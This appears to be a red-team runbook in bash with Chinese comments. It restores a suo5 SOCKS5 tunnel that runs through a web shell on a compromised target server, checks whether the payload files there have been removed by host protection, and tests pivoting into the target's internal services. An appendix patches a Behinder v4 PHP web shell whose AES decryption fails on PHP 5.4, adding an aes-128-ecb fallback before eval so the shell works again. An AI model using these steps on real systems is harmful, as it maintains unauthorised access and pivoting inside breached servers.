#!/bin/bash
# suo5 classic 隧道"自愈"标准动作：进程还在但穿不出去（curl: (97) cannot complete SOCKS5 connection）时用
# 1) 先判定：是真断还是假断（本机 no_proxy 会让 curl 绕过 socks5 直连本地 → 全 000 假象）
curl -s --noproxy "" --socks5-hostname 127.0.0.1:1082 -m 20 -o /dev/null -w "%{http_code}\n" "http://127.0.0.1/"
# 000 且 verbose 报 "cannot complete SOCKS5 connection to 127.0.0.1. (1)" ⇒ SOCKS5 reply=1，远端会话已死

# 2) 排除"载荷被主机防护清掉"：比对目标侧载荷 md5（走任何一条还活着的 PHP 通道）
#    /tmp/rc.inc、/www/wwwroot/<site>/2022/s5.inc 与本地备份 md5 一致 ⇒ 载荷没问题，是会话状态

# 3) 直接杀客户端重建（suo5 没有 reload，必须重启进程）
taskkill //F //IM suo5-windows-amd64.exe ; sleep 2
/c/Users/user/workspace/redteam/toolkit/suo5-windows-amd64.exe --mode classic --timeout 30 --retry 3 --debug \
  --proxy http://UPSTREAM_PROXY -t "https://TARGET/admin/example.com?g=1" -l 127.0.0.1:1082
# 日志出现 handshake succeeded, using session id: XXXX / test connection succeeded, tunnel is ready ⇒ 通

# 4) 实测穿透（必须 --noproxy ""）
curl -s --noproxy "" --socks5-hostname 127.0.0.1:1082 -m 25 -o /dev/null -w "%{http_code}\n" "http://127.0.0.1/"
curl -s --noproxy "" --socks5-hostname 127.0.0.1:1082 -m 25 -o /dev/null -w "%{http_code}\n" "http://127.0.0.1:888/"

# ---- 附带：PHP 5.4 冰蝎马"200 但空响应"的坑 ----
# 冰蝎 v4 马常用 openssl_decrypt($post, "AES128", $key)；
# 在 PHP 5.4.45 + 该 OpenSSL 构建上 "AES128" 不是合法 cipher 名 → 返回 false
#   ⇒ $post=false ⇒ explode('|',false) ⇒ $arr[1] 为空 ⇒ eval('') ⇒ HTTP 200 且 body 0 字节
# 目标侧探针回显：openssl_ext=true / dec_AES128=false / dec_ecb='t|echo ...'
# 修法（一行回退，同时兼容新老 OpenSSL）：
#   $raw = $post;
#   $post = @openssl_decrypt($raw, "AES128", $key);
#   if ($post === false) { $post = @openssl_decrypt($raw, "aes-128-ecb", $key); }
